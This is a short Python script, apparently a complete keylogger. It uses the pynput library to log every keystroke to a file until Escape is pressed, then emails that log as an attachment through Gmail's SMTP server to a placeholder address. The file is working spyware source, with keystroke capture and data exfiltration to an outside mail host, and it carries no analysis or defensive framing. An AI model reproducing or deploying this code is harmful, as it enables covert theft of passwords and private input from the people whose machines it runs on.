from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.message import EmailMessage

logdir = ""
logging.basicConfig(filename="keys.log", level=logging.DEBUG, format="%(asctime)s:%(message)s")

#You can also store email address and its password as environment variable
def on_pressed(key):
	try:
		logging.debug(str(key))
	except AttributeError:
		print("A special key {0} has been pressed".format(key))

def released_key(key):
	if key==Key.esc:
		return False

with Listener(on_press=on_pressed, on_release=released_key) as listener:
	listener.join()		
	
print("sending data to email account")	

msg = EmailMessage()
msg['Subject']="Keys Captured"
msg['From'] = "Sender's email"
msg['To'] = "Recipient email"
msg.set_content("result of key logger")
with open("keys.log", "rb") as f:
	data = f.read()
	name = f.name
msg.add_attachment(data,maintype="application",subtype="octet-stream",filename=name)

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
	smtp.login("email","password")   #Or better if you store it as environment variable
	smtp.send_message(msg)

print("file sent")
f.close()
		
	